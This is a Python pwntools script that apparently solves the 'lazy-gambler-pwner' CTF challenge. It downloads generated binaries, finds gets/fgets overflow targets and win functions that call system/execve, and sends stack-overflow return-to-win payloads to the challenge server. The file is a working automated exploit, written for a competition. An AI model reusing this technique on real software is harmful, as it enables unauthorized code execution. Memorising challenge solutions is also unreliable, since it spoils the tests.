from pwn import *

context.log_level = "DEBUG"
BIN_PATH = "code.bin"


def get_binary(io):
    io.recvuntil(b"----------------")
    b64_binary = io.recvuntil(b"----------------", drop=True)
    with open(BIN_PATH, "wb") as f:
        f.write(base64.b64decode(b64_binary))


payload = b'\0'


def main():
    io = remote("lazy-gambler-pwner.chal.idek.team", 1337)
    for idx in range(50):
        get_binary(io)

        # You now have "./code.bin" which is the vulnerable, good luck!
        #
        # Some tips:
        # - The way I check if the exploit was successful requires for the binary to *NOT*
        #   crash due to segfault & co.
        #
        # - My solve takes around 5 to 10 seconds per binaries on your average computer.
        #   If yours takes much longer, you may not be on the right path...
        #
        # - The vulnerable functions and the win functions changes a bit as to not make it
        #   *too* easy to discover, but they are still fairly straightforward. My solve
        #   has 10 to 20 lines for each. Don't overengineer!
        #
        # - There are some edge cases you may not have expected (I didn't either, but they
        #   were fun enough to be kept lol), so do take time to debug and figure out
        #   everything properly if your solve fail!
        #
        # - If you are confident the issue is on remote and not your script... Triple check!
        #   If it still persist, open a ticket and I'll do my best to figure out if it is
        #   on my side or not, and fix if needed.
        #
        e = ELF("code.bin")

        io_local = e.process()

        quizs = {}

        def disasm_all(e: ELF):
            text_start = e.address+0x1000
            return e.disasm(text_start, e.bss()-text_start)

        disasm_str = disasm_all(e).split('\n')

        def xrefs(function_address):
            for line in disasm_str:
                if f"call   {hex(function_address)}".upper() in line.upper():
                    _ = disasm_str.index(line)
                    for i in range(_, 0, -1):
                        if 'endbr64' in disasm_str[i]:
                            return int(disasm_str[i].split(":")[0], 16)

        def find_offset(function_address):
            for line in disasm_str:
                if f"{hex(function_address)[2:]}:" in line:
                    idx = disasm_str.index(line)
                    for i in range(idx, len(disasm_str)):
                        if "rax, [rbp-" in disasm_str[i]:
                            return int(disasm_str[i].split("-")[1].replace("]", ""), 16)
                    break

        try:
            win = xrefs(e.plt.system-4)
        except:
            win = xrefs(e.plt.execve-4)

        try:
            victim = xrefs(e.plt.gets-4)
        except:
            victim = xrefs(e.plt.fgets-4)

        offset = find_offset(victim)

        def solve(quiz):
            if len(quiz) == 0:
                return "WTF"

            _ = quiz.split(' ')
            choices = [_[2*i+1] for i in range(len(_)//2)]

            for choice in choices:
                if choice not in quizs[quiz]:
                    quizs[quiz].append(choice)
                    return choice

            quizs[quiz] = ['']

            for choice in choices:
                if choice not in quizs[quiz]:
                    quizs[quiz].append(choice)
                    return choice

        payload = b''
        done = False
        while True:
            quiz = io_local.recvline(
                timeout=1)

            if len(quiz) == 0:
                break

            elif b': No such file or directory\n' in quiz:
                done = True
                break

            quiz = quiz.decode().strip().replace("?", "")

            if quiz not in quizs:
                quizs[quiz] = ['']

            ans = solve(quiz).encode()
            io_local.sendline(ans)
            sleep(0.01)
            payload += ans+b' '

        if not done:
            io_local.sendline(
                b'A'*offset +
                p64(0) +
                p64(win)
            )
        exit_code = io_local.poll(True)

        payload += b'A'*offset + p64(0)
        if exit_code == -11:
            payload += p64(0x000000000040101a)
        payload += p64(win)

        b64_payload = base64.b64encode(payload)
        print(offset)
        io.sendlineafter(b"solution:\n", b64_payload)
        log.success(str(idx))
    io.interactive()


main()
